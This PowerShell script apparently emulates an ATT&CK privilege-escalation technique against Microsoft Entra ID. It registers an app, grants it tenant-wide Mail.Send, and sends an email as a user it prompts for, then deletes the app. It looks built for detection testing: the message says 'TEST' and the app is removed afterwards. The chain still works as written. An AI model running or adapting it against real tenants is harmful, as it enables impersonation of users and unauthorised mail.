<#
.SYNOPSIS
Connect to Graph API, create an app registration, assign it elevated permissions and use these to send an email on behalf of another user

.DESCRIPTION
TA0004: Privilege Escalation
T1548.005:  Abuse Elevation Control Mechanism: Temporary Elevated Cloud Access 
1st attack method
#>

Get-Module | Where-Object name -eq readenv | Remove-Module
Import-Module ../APIs/readEnv.psm1
Get-Module | Where-Object name -eq custom | Remove-Module
Import-Module ../APIs/custom.psm1
Get-Module | Where-Object name -eq randomPassword | Remove-Module
Import-Module ../Helpers/randomPassword.psm1


# We use the ews environment variables
Import-Environment "graph.env"

Get-Module | Where-Object name -eq oauth-microsoft | Remove-Module
Import-Module ../APIs/oauth-microsoft.psm1
$scope = "Application.ReadWrite.All AppRoleAssignment.ReadWrite.All"
if ($null -eq $accessToken) { $accessToken = Get-DelegatedAccessToken -tenantId $env:TENANT_ID -clientId $env:GRAPH_DELEGATE_CLIENT_ID -scope $scope -redirectUrl $env:GRAPH_DELEGATE_REDIRECT_URI }



# Create a new user account
$url = "https://graph.microsoft.com/v1.0/applications"
$rand = Get-Random -Minimum 1000 -Maximum 9999
$newApp = @{
    "displayName" = "TA0004 - T1548.005 - A1 - $rand";
    "passwordCredentials" = @(
        @{
            "displayName" = "Secret $rand";
        };
    );
    "requiredResourceAccess" = @(
        @{
            "resourceAppId" = "00000003-0000-0000-c000-000000000000"; # https://graph.microsoft.com
            "resourceAccess" = @(
                @{
					"id" = "b633e1c5-b582-4048-a93e-9f11b44c7e96"; # Mail.Send
					"type" = "Role";
				};
            );
        }
    );
};
$newApp = ConvertTo-Json -Depth 99 $newApp
$response = Invoke-RestMethod $url -Method Post -ContentType "application/json" -Headers @{"Authorization"="Bearer $accessToken"} -Body $newApp

$objectId = $response.id
$clientId = $response.appId
$clientSecret = $response.passwordCredentials[0].secretText

# Create a service principal for this app
$url = "https://graph.microsoft.com/v1.0/servicePrincipals"
$newSP = @{
    "appId" = $clientId;
} | ConvertTo-Json
$response = Invoke-RestMethod $url -Method Post -ContentType "application/json" -Headers @{"Authorization"="Bearer $accessToken"} -Body $newSP
$servicePrincipalId = $response.id

# Get graph resource ID
$url = "https://graph.microsoft.com/v1.0/servicePrincipals(appId='00000003-0000-0000-c000-000000000000')"
$response = Invoke-RestMethod $url -Method Get -ContentType "application/json" -Headers @{"Authorization"="Bearer $accessToken"}
$resourceId = $response.id

# Assign permissions
$url = "https://graph.microsoft.com/v1.0/servicePrincipals/$resourceId/appRoleAssignedTo"
$newAppRole = @{
    "principalId" = $servicePrincipalId;
    "resourceId" = $resourceId;
    "appRoleId" = "b633e1c5-b582-4048-a93e-9f11b44c7e96";
} | ConvertTo-Json
$response = Invoke-RestMethod $url -Method Post -ContentType "application/json" -Headers @{"Authorization"="Bearer $accessToken"} -Body $newAppRole

Write-Host $response

# We need to wait some moments for Entra ID to process these application permissions.
# If we do not wait, we run the chance of obtaining access tokens without the right scope
# This is unnoticeable because of the .default and the fact that we cannot read the scope in the access token itself
# It does not suffice to wait AFTER obtaining the access token although the scope is not included in the token
Wait-KeyOrTimeOut -Timeout 45000

# Get an access token using the application we have just created
$accessTokenEmail = Get-ClientAccessToken -tenantId $env:TENANT_ID -clientId $clientId -clientSecret $clientSecret -scope "https://graph.microsoft.com/.default"

# Send an email
$upn = Read-Host -Prompt "Email from (UPN)"
$url = "https://graph.microsoft.com/v1.0/users/$upn/sendMail"
$message = @{
    "message" = @{
        "subject" = "TA0004 - T1548.005 - A1 - $rand";
        "toRecipients" = @(
            @{
                "emailAddress" = @{
                    "address" = $upn;
                };
            };
        );
        "body" = @{ 
            "contentType" = "html";
            "content" = "TEST";
        };
    };
    "saveToSentItems" = $True;
}
$message = ConvertTo-Json -Depth 99 $message
$response = Invoke-RestMethod $url -Method Post -ContentType "application/json" -Headers @{"Authorization"="Bearer $accessTokenEmail"} -Body $message

# Delete the application again
$url = "https://graph.microsoft.com/v1.0/applications/$objectId"
$response = Invoke-RestMethod $url -Method Delete -ContentType "application/json" -Headers @{"Authorization"="Bearer $accessToken"}
